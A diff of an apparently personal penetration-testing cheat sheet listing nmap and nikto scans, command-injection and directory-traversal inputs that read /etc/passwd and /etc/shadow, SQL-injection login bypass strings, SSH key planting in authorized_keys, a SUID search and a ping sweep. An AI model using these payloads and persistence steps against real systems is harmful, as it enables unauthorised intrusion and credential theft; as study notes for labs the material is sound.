@@ -1,7 +1,7 @@
 
-nmap -Pn -T4 --min-rate 2435434 <IP> -p-
 
 NMAP Scripting Engine:
+       nmap -Pn -T4 --min-rate 2435434 <IP> -p-
        /usr/share/nmap/scripts
        nmap -Pn -T4 <ip> -p <ports> --script=banner.nse 
                                     --script=http-enum.nse <ip> -p <port>      (use to enum well known paths/dir from websites)
@@ -10,7 +10,7 @@ NMAP Scripting Engine:
        nikto -h <ip> -p <ports>
        
        
-       
+      /etc/hosts ;  ip neigh as a last resort
    Directory Traversal or Command Injection, for input fields.
     Command Inj
       ;whoami, 
@@ -19,8 +19,8 @@ NMAP Scripting Engine:
       ../../../../../../../../../etc/passwd (users/shell)  -OR- /etc/shadow
       ^^ 
       
-   /etc/hosts ;    
-   if web-shell.php can be used, ssh-keygen
+     
+   if web-shell.php can't be used, ssh-keygen:
    
      ssh-keygen -t rsa
      cat ~/.ssh/id_rsa.pub
@@ -30,6 +30,47 @@ NMAP Scripting Engine:
      echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
      cat /users/home/directory/.ssh/authorized_keys
 
-
+  POST SQL Inj:  f12network/reload/raw   copy next to url with ?   like below
+   ' or 1='1
+   
+  GET
+    <weblocation>/login.php?username=Admin&passwd=user' OR '1=1
+   
+   
+   Passwords may be encoded: Rot 13, Base64, Magic
+   
+   
+   
+   When on the box to escalate priv:
+   find / -type f -perm /4000 -ls 2>/dev/null (suid)(guid, 2000)
+   
+   Ping Sweep
+   for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done   (must be in bash shell)
+     
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
    
    
